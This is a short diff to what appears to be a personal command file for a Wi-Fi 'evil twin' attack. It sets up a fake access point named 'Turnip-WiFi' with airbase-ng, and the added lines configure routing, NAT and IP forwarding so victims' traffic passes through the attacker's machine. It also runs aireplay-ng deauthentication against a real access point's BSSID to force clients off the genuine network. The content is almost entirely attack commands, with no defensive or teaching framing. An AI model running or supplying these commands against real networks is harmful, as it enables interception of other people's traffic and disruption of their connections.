@@ -39,3 +39,10 @@ airmon-ng start wlan1
 # I think these commands do the same thing.
 airbase-ng -e Turnip-WiFi -c 11 wlan1
 ifconfig at0 up
+ifconfig at0 10.0.0.1 netmask 255.255.255.0
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+iptables -P FORWARD ACCEPT
+iptables -t nat -A POSTROUTING -o wlan0mon -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+aireplay-ng –deauth 50 -a [BSSID of real AP] wlan0mon
